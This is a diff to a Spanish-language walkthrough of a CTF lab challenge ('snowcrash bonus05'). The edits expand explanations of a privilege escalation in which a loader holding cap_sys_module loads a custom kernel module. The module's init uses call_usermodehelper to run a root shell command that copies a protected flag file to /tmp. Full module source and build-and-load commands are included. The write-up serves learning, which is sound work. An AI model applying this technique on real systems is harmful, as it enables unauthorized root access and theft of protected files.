@@ -87,10 +87,10 @@ Resultado:
 
 | Fichero | Rol |
 |---------|-----|
-| `rife` | Loader privilegiado (`finit_module`) |
-| `load_rife.sh` | Wrapper: `exec /opt/snowcrash/bonus05/rife "$1"` |
-| `rife_loader.c` | Código fuente documentado del loader |
-| `~/rife_template.c` | Esqueleto de módulo kernel con TODO A/B |
+| `rife` | Binario compilado que ejecuta la syscall `finit_module` para cargar en el kernel el `.ko` que se le pase como argumento. Se llama **"loader privilegiado"** porque, gracias a su capability `cap_sys_module` (ver abajo), puede cargar módulos de kernel aunque quien lo ejecute no sea `root`. |
+| `load_rife.sh` | Script que solo reenvía el argumento recibido al binario `rife`: `exec /opt/snowcrash/bonus05/rife "$1"`. Se le llama **"wrapper"** porque no hace nada por sí mismo, solo envuelve la llamada a `rife`. |
+| `rife_loader.c` | Código fuente de `rife`, legible aunque el binario compilado no lo sea; sirve para entender qué hace el loader sin poder leer el ejecutable directamente. |
+| `~/rife_template.c` | Archivo de partida (en el `home` de `bonus05`, no en `/opt/snowcrash/bonus05`) para escribir **tu propio módulo de kernel**. Se le llama **"esqueleto"** porque ya trae la estructura del módulo (registro en `/proc`, `init`/`exit`) pero dos funciones están sin terminar, marcadas como `TODO A` y `TODO B` (detalladas en la sección 3); hay que completarlas para que el módulo haga lo necesario. |
 
 Capabilities del loader:
 
@@ -120,7 +120,11 @@ No hay servicio `systemd` propio de bonus05: el vector es el loader + un
 
 ## 3. Documentación del loader (`rife_loader.c`)
 
-Fragmentos relevantes:
+```bash
+cat /opt/snowcrash/bonus05/rife_loader.c
+```
+
+Tras ejecutar esto, vemos los fragmentos relevantes:
 
 ```c
 /* finit_module(fd, param_values, flags) */
@@ -144,15 +148,27 @@ Comentarios del propio fuente:
 - Tras cargar el módulo, se espera poder leer la flag en **`/proc/rife`**.
 - La capability se asigna con `setcap cap_sys_module+ep` sobre este binario.
 
-La plantilla `rife_template.c` pide implementar:
+Para ver el contenido de la plantilla del módulo (en el `home` de `bonus05`,
+no en `/opt/snowcrash/bonus05`):
+
+```bash
+cat ~/rife_template.c
+```
+
+Al leerla, se observa que pide implementar:
 
 - **TODO A:** callback `rife_proc_show` (escribir datos en el `seq_file`).
 - **TODO B:** eliminar `/proc/rife` en el `exit` del módulo (`proc_remove`).
 
-También registra `/proc/rife` en el `init` con `proc_create_single`. El array
-`rife_data[]` de la plantilla está **vacío**, así que un `seq_puts` de esa
-cadena no entrega la flag. Hace falta **leer** `/home/flagbonus05/.flag` con
-privilegios de kernel/root.
+También registra `/proc/rife` en el `init` mediante `proc_create_single`.
+Cuando se ejecuta `cat /proc/rife`, el kernel llama a `rife_proc_show`, que
+debe escribir la respuesta usando `seq_puts` o `seq_printf`. Sin embargo,
+`rife_data[]` está **vacío**: mostrarlo no revela la flag. Primero hay que
+obtener el contenido de `/home/flagbonus05/.flag` mediante una operación con
+privilegios de root/kernel y, después, escribir ese contenido en `/proc/rife`.
+La solución desarrollada en la sección 5 toma otra ruta: no completa estos
+TODO ni usa `/proc/rife`, sino que carga un módulo auxiliar que crea
+`/tmp/rife_flag`.
 
 ---
 
@@ -200,15 +216,21 @@ mínimo y verificar con `head` / `wc -l` antes de `make`.
 
 ---
 
-## 5. Solución: `call_usermodehelper` en el `init` del módulo
+## 5. Solución: ejecutar un comando como root con `call_usermodehelper`
 
-`call_usermodehelper` lanza un proceso en espacio de usuario **con privilegios
-de root** (contexto del helper de kernel). Desde el `module_init` se puede
-copiar el `.flag` a un path legible por `bonus05`:
+`call_usermodehelper` es una función del kernel que permite lanzar un programa
+normal de Linux desde un módulo. El proceso se ejecuta con las credenciales del
+helper del kernel, normalmente con privilegios de root. Por eso, desde
+`module_init` se puede copiar el `.flag` a un path legible por `bonus05`:
 
 ```text
 cp /home/flagbonus05/.flag /tmp/rife_flag && chmod 644 /tmp/rife_flag
 ```
+
+La función no lee la flag directamente. En su lugar, pide al kernel que
+ejecute un comando normal (`/bin/sh`). El comando copia el archivo protegido a
+`/tmp/rife_flag` y cambia sus permisos para que `bonus05` pueda leerlo.
+En esta solución se lee directamente esa copia; no se utiliza `/proc/rife`.
 
 ### 5.1. Crear el directorio de trabajo
 
@@ -224,7 +246,27 @@ printf 'obj-m := rife4.o\n' > Makefile
 cat Makefile
 ```
 
+Salida esperada:
+
+```text
+bonus05@snowcrash:~/rife_build$ cat Makefile
+obj-m := rife4.o
+```
+
 ### 5.3. Fuente del módulo (vía base64, sin heredoc frágil)
+
+El bloque largo que empieza por `I2luY...` es el código C de un módulo nuevo,
+codificado en Base64. Al decodificarlo se crea `rife4.c`; no se está
+reconstruyendo todo `rife_template.c`. La plantilla original contiene la
+lógica de `/proc/rife` y sus TODO, mientras que este módulo solo incluye lo
+mínimo necesario para ejecutar `call_usermodehelper` y copiar la flag a
+`/tmp/rife_flag`. Por eso su contenido es más corto y no contiene el callback
+`rife_proc_show`.
+
+`base64 -d` convierte ese texto en el código fuente de `rife4.c`. Se usa Base64
+para evitar que las comillas, los saltos de línea o caracteres especiales se
+rompan al pegar el código por SSH. `'B64'` es solo la marca que indica dónde
+termina el texto que debe decodificarse.
 
 ```bash
 base64 -d > rife4.c << 'B64'
@@ -247,6 +289,18 @@ wc -l rife4.c
 head -25 rife4.c
 ```
 
+Estos comandos sirven para verificar que el texto Base64 se ha convertido
+correctamente antes de compilar:
+
+- `wc -l rife4.c` cuenta las líneas del archivo y confirma que no está vacío ni
+  se ha pegado de forma incompleta.
+- `head -25 rife4.c` muestra las primeras 25 líneas para comprobar que el
+  resultado empieza como código C válido, con sus `#include` y la función de
+  inicialización.
+
+No ejecutan el módulo ni leen la flag; solo inspeccionan el archivo fuente
+recién creado.
+
 Equivalente en C legible:
 
 ```c
@@ -261,17 +315,22 @@ MODULE_DESCRIPTION("Rife umh helper");
 
 static int __init rife_init(void)
 {
+	/* argv contiene el programa y sus argumentos.
+	 * Aquí se ejecuta: /bin/sh -c "<comando>". */
 	char *argv[] = {
 		"/bin/sh",
 		"-c",
 		"cp /home/flagbonus05/.flag /tmp/rife_flag && chmod 644 /tmp/rife_flag",
 		NULL
 	};
+	/* Variables de entorno mínimas que usará el proceso ejecutado. */
 	char *envp[] = {
 		"HOME=/",
 		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
 		NULL
 	};
+	/* UMH_WAIT_PROC hace que el módulo espere a que termine el comando.
+	 * ret indica si la ejecución terminó correctamente o con error. */
 	int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 	pr_info("rife4: umh ret=%d\n", ret);
 	return 0;
@@ -291,13 +350,32 @@ module_exit(rife_exit);
 ```bash
 make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
 ls -la rife4.ko
-
-/opt/snowcrash/bonus05/rife $(pwd)/rife4.ko
-# mensaje: rife: module loaded — cat /proc/rife
 ```
 
-(El mensaje del loader menciona `/proc/rife` por el diseño original; en esta
-solución la flag está en `/tmp/rife_flag`.)
+El primer comando compila el módulo:
+
+- `make -C /lib/modules/$(uname -r)/build` usa el sistema de compilación del
+  kernel que está ejecutándose; `uname -r` obtiene su versión.
+- `M=$(pwd)` indica que el código del módulo y el `Makefile` están en el
+  directorio actual (`~/rife_build`).
+- `modules` pide compilar el módulo externo y generar `rife4.ko`.
+
+El segundo comando (`ls -la rife4.ko`) muestra los permisos, propietario y
+tamaño del archivo generado. Sirve para confirmar que la compilación creó el
+módulo que después se carga con el programa `rife`.
+
+El archivo `rife4.ko` es necesario porque el programa `rife` solo sabe cargar
+módulos del kernel. Al cargarlo, se ejecuta automáticamente `rife_init`, que
+llama a `call_usermodehelper` y crea `/tmp/rife_flag` copiando allí la flag.
+Por tanto, el archivo temporal no existía antes de cargar el módulo: es el
+resultado de ejecutar `rife4.ko`.
+
+Por tanto, ejecutamos el siguiente comando para cargar `rife4.ko`. Al
+cargarse, el módulo ejecuta `rife_init` y crea `/tmp/rife_flag`:
+
+```bash
+/opt/snowcrash/bonus05/rife $(pwd)/rife4.ko
+```
 
 ### 5.5. Leer la flag
 
